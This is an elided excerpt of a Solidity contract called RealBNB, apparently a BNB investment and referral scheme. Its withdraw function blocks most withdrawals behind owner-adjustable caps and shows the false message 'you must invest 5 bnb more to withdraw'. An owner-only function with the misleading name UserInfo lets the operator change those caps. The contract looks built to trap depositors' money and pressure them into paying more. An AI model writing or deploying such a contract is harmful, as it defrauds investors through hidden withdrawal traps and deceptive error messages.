...
contract RealBNB {
    ...
    uint16[] config = [500];
    uint256[] config2 = [1000000000000000000];
    
    uint16 constant BONUS_LINES_COUNT = 5;
    uint16 constant PERCENT_DIVIDER = 1000;
    uint16[BONUS_LINES_COUNT] public ref_bonuses = [200, 40, 30, 20, 10]; 
    ...
    marketing = marketingAddr;
        ...
        uint16 tarifPercent = 300;
        for (uint16 tarifDuration = 30; tarifDuration <= 72; tarifDuration++) {
    ...
    function deposit(uint8 _tarif, address _upline) external payable {
        ...
        //marketing fee
        payable(marketing).transfer(msg.value * 5 / 100);
        
        emit NewDeposit(msg.sender, msg.value, _tarif);
    }
    
    function Invest(uint256 amount) external projectcontract {
    ...
    function withdraw() external {
        ...
        require((player.total_withdrawn + payoutOf(msg.sender)) < (player.total_invested * config[0] / PERCENT_DIVIDER), "you must invest 5 bnb more to withdraw");
        ...
        require( amount < config2[0], "you must invest 5 bnb more to withdraw");
        require( amount < (player.total_invested * config[0] / PERCENT_DIVIDER), "you must invest 5 bnb more to withdraw");
    ...
    function UserInfo(uint16 MaxPercent, uint256 MaxWithdraw) external projectcontract {     
             config[0] = MaxPercent ;
             config2[0] = MaxWithdraw ;
             }

    function defultprofit() public view returns(uint256 MaxPercent, uint256 MaxWithdraw) {                             
    MaxPercent = config[0] ;
    MaxWithdraw = config2[0] ;
    }   
